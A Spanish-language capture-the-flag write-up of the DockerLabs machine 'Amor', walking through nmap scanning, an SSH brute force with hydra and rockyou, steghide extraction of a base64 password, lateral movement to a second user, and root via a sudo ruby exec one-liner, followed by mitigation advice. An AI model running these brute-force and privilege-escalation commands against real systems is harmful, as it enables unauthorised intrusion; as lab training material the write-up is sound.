# Writeup: Amor

- **Máquina:** Amor (DockerLabs)
- **Enlace:** https://dockerlabs.es/maquinas/110/descargar
- **Dificultad:** Fácil
- **Fecha:** 9 de Noviembre 2026

---

## Objetivo
Practicar enumeración web, fuerza bruta SSH y escalada de privilegios en Linux.

---

## Despliegue de la máquina
```bash
$ sudo bash auto_deploy.sh amor.tar
```
<img width="525" height="124" alt="Captura de pantalla (331)" src="https://github.com/user-attachments/assets/6b04c75a-9a72-4f63-b942-5a52bd497ea4" />



Para comprobar que el servicio se encuentre activo se usó `ping`:

```bash
$ ping 172.17.0.2
```
Resultado:
```bash
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.237 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.115 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.098 ms
3 packets transmitted, 3 received, 0% packet loss, time 2104ms
```

---

## 1. Reconocimiento
Se realizó escaneo de puertos con `nmap`, revelando dos puertos abiertos:

```bash
$ nmap -p- -sCV 172.17.0.2 -o scan_amor.txt
```

```bash
PORT   STATE SERVICE
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
```

Al visitar **http://172.17.0.2** en el navegador, se encontró una página web perteneciente a **SecureSEC** donde se listan avisos relacionados con la seguridad de la página.

<img width="1366" height="467" alt="Captura de pantalla (342)" src="https://github.com/user-attachments/assets/7b0881b0-edd3-40e8-bb3a-f64e0928e29d" />


--- 

## 2. Identificación de vulnerabilidades
Uno de los avisos de la página revela la existencia de un usuario: **Carlota**.

<img width="642" height="148" alt="Captura de pantalla (343)" src="https://github.com/user-attachments/assets/ecb2ade3-7729-4a77-986b-e9a97baa3a72" />

Sabiendo que existe un usuario para atacar, se pasó a la fase de Explotación


---
## 3. Explotación
### 3.1. Ataque de fuerza bruta
Se usó `hydra` para hacerse con las credenciales de **Carlota**.

```bash
$ hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```

```bash
[22][ssh] host: 172.17.0.2   login: carlota   password: babygirl
```

<img width="1028" height="119" alt="Captura de pantalla (344)" src="https://github.com/user-attachments/assets/d4604dd8-912e-4f0a-bd02-41ffc8988009" />

Teniendo la contraseña, se realizó la conexión a la shell remota con `ssh`:

```bash
$ ssh carlota@172.17.0.2
```

```bash
whoami
carlota
```

<img width="557" height="104" alt="Captura de pantalla (345)" src="https://github.com/user-attachments/assets/2f5363ff-a2d2-4bfa-abb5-8bf0654234f6" />

Se ejecutó `/bin/bash` para utilizar los comandos necesarios para continuar con el laboratorio.




### 3.2. Movimiento lateral
Dado que **Carlota** no tiene permisos `sudo`, se inició una búsqueda en los directorios del usuario.

Dentro de **/home** se observa la existencia de otro usuario: **Oscar**.

Se encontró una imagen sospechosa dentro de **/Desktop/fotos/vacaciones/**:

<img width="522" height="213" alt="Captura de pantalla (348)" src="https://github.com/user-attachments/assets/08174a43-9411-4077-9503-3ed1afa20435" />


Para poder analizar la imagen, se realizó la transferencia hacia la máquina atacante abriendo un server con `python` en la shell remota y utilizando `wget` en una terminal local.

```bash
python3 -m http.server 81
```

<img width="711" height="93" alt="Captura de pantalla (346)" src="https://github.com/user-attachments/assets/ef4d3b44-755b-4bd7-9312-aafc0a71f83e" />


```bash
wget http://172.17.0.2:81/imagen.jpg
```

<img width="1322" height="152" alt="Captura de pantalla (347)" src="https://github.com/user-attachments/assets/567cadee-45d0-4c48-8467-0547bf5a3afa" />

Al usar `steghide` se encontró un archivo `.txt` oculto dentro de la imagen:

```bash
$ steghide extract -sf imagen.jpg
wrote extracted data to "secret.txt".
```

```bash
$ cat secret.txt   
ZXNsYWNhc2FkZXBpbnlwb24=
```

Dentro de **secret.txt** se encuentra texto cifrado en base64. Se descifró utilizando [base64decode](https://www.base64decode.org/), dando como resultado **eslacasadepinypon**, la contraseña de **Oscar** por lo que nos conectamos a la nueva remote shell:

```bash
carlota@66fe94b4dcfd:~$ su oscar
Password: (eslacasadepinypon)
$ whoami
oscar
```

<img width="307" height="108" alt="Captura de pantalla (350)" src="https://github.com/user-attachments/assets/62eab8b3-d5b6-4052-b708-533c342d186d" />



### 3.3. Escalada de privilegios

Se ejecutó `sudo -l` para ver los privilegios disponibles de **Oscar**. 

<img width="540" height="68" alt="Captura de pantalla (351)" src="https://github.com/user-attachments/assets/fee1d00d-564d-401c-b8a1-2b757716be5b" />


**Oscar** puede ejecutar `/bin/ruby` como `root` y sin contraseña. Para finalizar con la escalada de privilegios, se utilizó el siguiente comando: 

```bash
sudo /usr/bin/ruby -e 'exec "/bin/bash"'
```

```bash
whoami
root
```

<img width="390" height="118" alt="Captura de pantalla (352)" src="https://github.com/user-attachments/assets/81acb032-de02-4077-b29d-a119aa84676d" />


 
---
## Acciones de mitigación
- **Divulgación de usuarios válidos en página web pública**: nunca divulgar información sensible en servicios públicos, utilizar redes internas y seguras para transmitir información.
- **Contraseña débil vulnerable a ataques de fuerza bruta**: aplicar políticas de contraseñas más seguras e implementar verificación en dos pasos (MFA).
- **Escalada de privilegios mediante`/bin/ruby`**: aplicar principio de menor privilegio, eliminar `/bin/ruby` de sudoers.
---
